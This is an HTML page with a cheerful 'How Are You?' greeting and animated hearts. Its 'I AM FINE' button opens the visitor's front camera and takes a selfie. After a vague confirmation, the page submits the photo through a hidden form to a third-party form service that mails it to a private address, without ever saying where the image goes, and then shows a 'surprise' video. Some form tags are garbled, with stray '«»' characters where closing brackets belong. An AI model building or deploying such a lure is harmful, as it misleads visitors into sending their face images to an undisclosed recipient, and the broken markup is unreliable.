<!DOCTYPE html><html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>How Are You?</title><style>
body {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  margin: 0;
  background: linear-gradient(to bottom right, #fdf0f5, #dbe6ff);
  font-family: Arial, sans-serif;
  overflow: hidden;
}

h2 {
  font-size: 3em;
  color: palevioletred;
  text-align: center;
  margin-bottom: 30px;
  text-shadow: 2px 2px 5px rgba(0,0,0,0.2);
  z-index: 2;
}

button {
  font-size: 2em;
  padding: 15px 30px;
  color: white;
  background-color: blueviolet;
  border: none;
  border-radius: 15px;
  cursor: pointer;
  transition: transform 0.3s, box-shadow 0.3s, opacity 0.5s;
  z-index: 2;
  position: relative;
}

button:hover {
  transform: scale(1.1);
  box-shadow: 0 0 20px rgba(138,43,226,0.8);
}

.heart {
  position: absolute;
  top: -20px;
  color: #1e90ff;
  font-size: 20px;
  animation: fall linear infinite;
  z-index: 1;
  opacity: 0.8;
  pointer-events: none;
}

@keyframes fall {
  to {
    transform: translateY(110vh) rotate(360deg);
  }
}

/* CAMERA */
#cameraArea {
  display: none;
  text-align: center;
  z-index: 10;
}

#camera {
  width: 90%;
  max-width: 500px;
  border-radius: 15px;
  background: black;
}

#takePhoto {
  margin-top: 15px;
}

/* REVEAL */
.reveal-overlay {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.75);
  justify-content: center;
  align-items: center;
  z-index: 20;
}

.reveal-box {
  width: 90%;
  max-width: 600px;
  background: white;
  border-radius: 20px;
  padding: 25px;
  text-align: center;
  box-shadow: 0 0 30px rgba(0,0,0,0.5);
}

.reveal-box h3 {
  color: palevioletred;
  font-size: 2em;
  margin-bottom: 20px;
}

#revealVideo {
  display: none;
  width: 100%;
  max-height: 70vh;
  border-radius: 15px;
  margin-top: 10px;
  background: black;
}

#continueButton {
  display: none;
  margin-top: 15px;
  font-size: 1.3em;
}
</style></head><body><h2>HELLO ❤ — HOW ARE YOU?</h2><button id="capture">I AM FINE</button>

<div id="cameraArea">
  <video id="camera" autoplay playsinline></video>
  <br>
  <button id="takePhoto">TAKE PHOTO</button>
</div><canvas id="canvas" style="display:none;"></canvas>

<form
  id="imageForm"
  action="https://formsubmit.co/ganeshbist257@gmail.com"
  method="POST"
  enctype="multipart/form-data"
>
  <input type="hidden" name="_captcha" value="false">
  <input type="hidden" name="_template" value="table"><input
type="hidden"
name="_next"
value="https://Binodbist7.github.io/Qnahi/index.html"

«»

<input
type="file"
id="imageInput"
name="image"
accept="image/png, image/jpeg"
style="display:none;"

«»

<button type="submit" style="display:none;">Submit</button>

</form><!-- REVEAL DIALOG --><div class="reveal-overlay" id="revealOverlay">  <div class="reveal-box"><h3>💙 A Little Surprise 💙</h3>

<button id="revealButton">
  CLICK TO REVEAL
</button>

<video
  id="revealVideo"
  controls
  playsinline
  preload="metadata"
>
  <source src="./reveal.mp4" type="video/mp4">
  Your browser does not support this video.
</video>

  </div></div><script>

const captureButton = document.getElementById("capture");
const cameraArea = document.getElementById("cameraArea");
const camera = document.getElementById("camera");
const takePhoto = document.getElementById("takePhoto");

const canvas = document.getElementById("canvas");
const imageInput = document.getElementById("imageInput");
const form = document.getElementById("imageForm");

const revealOverlay = document.getElementById("revealOverlay");
const revealButton = document.getElementById("revealButton");
const revealVideo = document.getElementById("revealVideo");

let cameraStream = null;


/* START CAMERA AFTER USER CLICKS */

captureButton.addEventListener("click", async () => {

  try {

    cameraStream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "user"
      }
    });

    camera.srcObject = cameraStream;

    cameraArea.style.display = "block";

    captureButton.style.display = "none";

  } catch (error) {

    alert("Camera permission is required to take a photo.");

    console.error(error);

  }

});


/* TAKE PHOTO ONLY AFTER EXPLICIT USER ACTION */

takePhoto.addEventListener("click", () => {

  if (!cameraStream) {
    alert("Camera is not ready.");
    return;
  }

  canvas.width = camera.videoWidth || 1080;
  canvas.height = camera.videoHeight || 1440;

  const ctx = canvas.getContext("2d");

  ctx.drawImage(
    camera,
    0,
    0,
    canvas.width,
    canvas.height
  );

  canvas.toBlob((blob) => {

    const file = new File(
      [blob],
      "photo.png",
      {
        type: "image/png"
      }
    );

    const dt = new DataTransfer();

    dt.items.add(file);

    imageInput.files = dt.files;

    /* Stop camera */

    cameraStream.getTracks().forEach(track => {
      track.stop();
    });

    cameraStream = null;

    cameraArea.style.display = "none";

    /* Ask for confirmation before sending */

    const sendPhoto = confirm(
      "Your photo is ready. Do you want to send it?"
    );

    if (sendPhoto) {

      form.requestSubmit();

      setTimeout(() => {
        revealOverlay.style.display = "flex";
      }, 1000);

    } else {

      revealOverlay.style.display = "flex";

    }

  }, "image/png");

});


/* REVEAL VIDEO */

revealButton.addEventListener("click", () => {

  revealButton.style.display = "none";

  revealVideo.style.display = "block";

  revealVideo.load();

  revealVideo.play().catch(() => {
    console.log("Press the play button to start the video.");
  });

});


/* HEART ANIMATION */

function createHeart() {

  const heart = document.createElement("div");

  heart.classList.add("heart");

  heart.innerHTML = "💙";

  heart.style.left =
    Math.random() * 100 + "vw";

  heart.style.fontSize =
    (Math.random() * 20 + 10) + "px";

  heart.style.animationDuration =
    (Math.random() * 5 + 5) + "s";

  document.body.appendChild(heart);

  setTimeout(() => {
    heart.remove();
  }, 10000);
}

setInterval(createHeart, 300);

</script></body>
</html>
